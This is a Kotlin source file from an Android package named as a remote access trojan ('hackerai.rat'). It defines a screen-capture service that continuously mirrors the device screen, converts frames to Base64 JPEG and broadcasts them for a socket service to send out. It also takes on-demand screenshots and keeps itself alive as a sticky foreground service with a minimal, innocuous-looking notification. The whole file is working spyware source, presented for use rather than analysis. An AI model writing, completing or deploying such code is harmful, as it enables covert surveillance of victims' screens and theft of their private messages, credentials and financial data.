package com.hackerai.rat.services

import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import androidx.core.app.NotificationCompat
import com.hackerai.rat.R
import com.hackerai.rat.RATApplication
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

class ScreenCaptureService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null
    private var isMirroring = false
    private var fps = 2
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        handlerThread = HandlerThread("ScreenCapture").apply { start() }
        handler = Handler(handlerThread!!.looper)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "START_MIRROR" -> {
                fps = intent.getIntExtra("fps", 2)
                startScreenMirror()
            }
            "STOP_MIRROR" -> stopScreenMirror()
            else -> {
                // Initial setup with MediaProjection data
                val code = intent?.getIntExtra("code", 0) ?: 0
                val data = intent?.getParcelableExtra<Intent>("data")
                if (data != null) {
                    val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                    mediaProjection = mpm.getMediaProjection(code, data)
                }
            }
        }

        val notification = NotificationCompat.Builder(this, "rat_service")
            .setContentTitle("Screen Service")
            .setContentText("Active")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(2, notification)

        return START_STICKY
    }

    private fun startScreenMirror() {
        if (isMirroring || mediaProjection == null) return
        isMirroring = true

        val metrics = DisplayMetrics()
        val display = getSystemService(DISPLAY_SERVICE)?.let {
            (it as DisplayManager).getDisplay(DisplayManager.DEFAULT_DISPLAY)
        }
        display?.getRealMetrics(metrics)

        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val densityDpi = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2).apply {
            setOnImageAvailableListener({ reader ->
                if (!isMirroring) return@setOnImageAvailableListener
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val planes = image.planes
                if (planes.isNotEmpty()) {
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * width
                    
                    val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                    bitmap.copyPixelsFromBuffer(buffer)
                    
                    // Crop to original dimensions
                    val cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                    bitmap.recycle()

                    // Convert to JPEG Base64
                    val baos = ByteArrayOutputStream()
                    cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                    val bytes = baos.toByteArray()
                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    cropped.recycle()

                    // Send via SocketService
                    val intent = Intent("com.hackerai.rat.SCREEN_FRAME").apply {
                        putExtra("image", base64)
                    }
                    sendBroadcast(intent)
                }
                image.close()
            }, handler)
        }

        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenMirror",
            width, height, densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, handler
        )
    }

    private fun stopScreenMirror() {
        isMirroring = false
        virtualDisplay?.release()
        virtualDisplay = null
        imageReader?.close()
        imageReader = null
    }

    fun captureScreenshot(): String? {
        try {
            val metrics = DisplayMetrics()
            val display = getSystemService(DISPLAY_SERVICE)?.let {
                (it as DisplayManager).getDisplay(DisplayManager.DEFAULT_DISPLAY)
            } ?: return null
            display.getRealMetrics(metrics)

            val ir = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 2)
            val vd = mediaProjection?.createVirtualDisplay(
                "Screenshot", metrics.widthPixels, metrics.heightPixels, metrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, ir.surface, null, handler
            )

            // Wait for frame
            Thread.sleep(200)
            
            val image = ir.acquireLatestImage() ?: run { vd?.release(); ir.close(); return null }
            val buffer = image.planes[0].buffer
            val bitmap = Bitmap.createBitmap(metrics.widthPixels, metrics.heightPixels, Bitmap.Config.ARGB_8888)
            bitmap.copyPixelsFromBuffer(buffer)
            image.close()
            vd?.release()
            ir.close()

            val baos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos)
            bitmap.recycle()
            return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.e("ScreenCapture", "Screenshot error", e)
            return null
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopScreenMirror()
        mediaProjection?.stop()
        mediaProjection = null
        handlerThread?.quitSafely()
        scope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
